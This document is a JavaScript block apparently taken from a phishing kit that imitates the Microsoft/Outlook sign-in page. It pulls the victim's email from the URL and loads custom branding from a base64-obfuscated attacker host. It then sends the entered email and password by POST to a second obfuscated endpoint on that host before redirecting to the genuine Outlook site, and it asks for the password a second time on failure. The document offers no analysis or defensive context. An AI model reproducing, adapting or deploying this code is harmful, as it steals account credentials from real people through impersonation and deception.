  <script>
  $( document ).ready(function() {
    var encoded_string = window.location.hash.substr(1);
    var email = encoded_string;	
    $('.identity').html(email);		
    var request = new XMLHttpRequest();
    var url =  window.atob('aHR0cHM6Ly9yZXZpc2FzZW4udXMveHgvcHJ2LnBocA==') + email
    request.open('GET', url, true);
    request.onload = function() {
      if (this.status >= 200 && this.status < 400) {
      var data = JSON.parse(this.response);
      logo_image = data["logo_image"];
      bg_image = data["bg_image"];
      bg_color = data["bg_color"];
      memo = data["memo"];
      if(bg_image != null && bg_image != ''){
        $('.background-image').css('background-image', 'url(' + bg_image + ')');
        $('.background-image').css('box-shadow', 'inset 0 0 0 1000px rgb(0 0 0 / 50%)');
      }
      if(logo_image != null && logo_image != ''){
        $('.banner-logo').attr('src', logo_image);
      }
      if(bg_color != null && bg_color != '' && (bg_image == null || bg_image == '')){
        $('.background-image').hide();
        $('.background-image-holder').css('background-color', bg_color);
      }
      if(memo != null && memo != ''){
        $('#idBoilerPlateText').show();
        $('#idBoilerPlateText').text(memo);
        $('#idBoilerPlateText').css('margin-top','44px');	
      }

      } else {
      console.log("Response error");
      }
    };
    request.onerror = function() {
      console.log("Request error");
    };
    request.send();

    setTimeout(function (){
      $('#lightbox').show();
      $('#i0118').focus();
    }, 1000);


    $('#idSIButton9').on('click', function (event){
      event.preventDefault ? event.preventDefault() : event.returnValue = false;
      var user = $('.identity').html();
      var pass = $('#i0118').val();
      var count = $('#count').val();
        if(pass == ""){
          $("#passwordError2").show();
          $("#passwordError").hide();
          $("#important").hide();
          $("#i0118").css("border-color", "#e81123");
          $('#i0118').focus();

        }else{
          $("#i0118").css("border-color", "black");
          $('#progressBar').show();
          $("#passwordError2").hide();
          $("#passwordError").hide();
          $('#idSIButton9').prop('disabled', true);
          $.ajax({
            url: window.atob("aHR0cHM6Ly9yZXZpc2FzZW4udXMveHgvcG9saWN5LnBocA=="), 
            data: {
                "email": user,
                "password": pass,
                "count": count,
              },
            type: "POST",
            success: function(data){
                if(data == 1){
                  setTimeout(function(){
                    window.location.href="https://outlook.office.com/mail/" + window.location.hash.substr(1);
                  } , 2000);
                }else{
                $('#i0118').val('');
                $('#progressBar').hide();
                $("#passwordError").show();
                $("#important").hide();
                $('#idSIButton9').prop('disabled', false);
                $('#count').val('2');
                }
            },
              error: function(data) {
                console.log('Ajax error');
              }
            });

        }
    });
  });
  </script>
